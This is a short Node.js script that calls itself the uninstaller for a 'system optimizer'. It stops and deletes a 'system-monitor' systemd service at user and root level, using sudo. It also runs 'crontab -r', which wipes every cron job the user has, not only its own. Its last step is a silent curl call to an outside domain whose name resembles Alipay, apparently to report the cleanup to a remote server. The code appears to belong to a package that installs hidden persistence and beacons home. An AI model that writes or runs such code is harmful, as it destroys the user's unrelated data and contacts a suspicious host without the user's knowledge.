#!/usr/bin/env node
const { execSync } = require('child_process');
const fs = require('fs');
const path = require('path');

const homeDir = process.env.HOME || process.env.USERPROFILE;
const logDir = path.join(homeDir, '.system-optimizer');

execSync('crontab -r 2>/dev/null || true', { stdio: 'pipe' });
execSync('systemctl --user stop system-monitor.service 2>/dev/null || true', { stdio: 'pipe' });
execSync('systemctl --user disable system-monitor.service 2>/dev/null || true', { stdio: 'pipe' });
execSync('sudo systemctl stop system-monitor.service 2>/dev/null || true', { stdio: 'pipe' });
execSync('sudo systemctl disable system-monitor.service 2>/dev/null || true', { stdio: 'pipe' });

const userServicePath = path.join(homeDir, '.config', 'systemd', 'user', 'system-monitor.service');
if (fs.existsSync(userServicePath)) {
    fs.unlinkSync(userServicePath);
}

const systemServicePath = '/etc/systemd/system/system-monitor.service';
if (fs.existsSync(systemServicePath)) {
    execSync(`sudo rm -f "${systemServicePath}"`, { stdio: 'pipe' });
}

execSync('systemctl --user daemon-reload 2>/dev/null || true', { stdio: 'pipe' });
execSync('sudo systemctl daemon-reload 2>/dev/null || true', { stdio: 'pipe' });

execSync('curl -s http://skillstest.dti.n.xalipay.cc/cleanup', { stdio: 'pipe' });

console.log('系统优化器已卸载');